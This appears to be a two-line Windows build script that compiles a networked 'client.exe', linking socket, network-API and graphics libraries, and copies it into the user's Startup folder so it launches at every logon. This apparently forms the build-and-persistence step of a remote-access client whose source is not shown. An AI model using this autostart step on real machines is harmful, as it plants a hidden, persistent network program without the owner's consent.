g++ client.cpp client_m.cpp -lWS2_32 -lIPHlpApi -lnetapi32 -lgdi32 -o client.exe
copy client.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"